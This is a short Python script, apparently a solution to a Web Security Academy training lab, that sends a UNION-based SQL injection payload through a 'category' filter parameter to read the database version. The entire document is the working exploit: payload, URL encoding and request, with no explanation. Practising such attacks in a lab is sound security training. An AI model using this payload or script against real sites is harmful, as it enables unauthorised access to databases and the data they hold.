import requests, urllib.parse

def encodeURI(s):
    return urllib.parse.quote(s)

URL = "https://0a56007503a79edf818e392f009b00e8.web-security-academy.net/"
PARAM = "filter?category="
PAYLOAD = "' UNION SELECT @@version, NULL -- -"

requests.get(URL + PARAM + encodeURI(PAYLOAD))
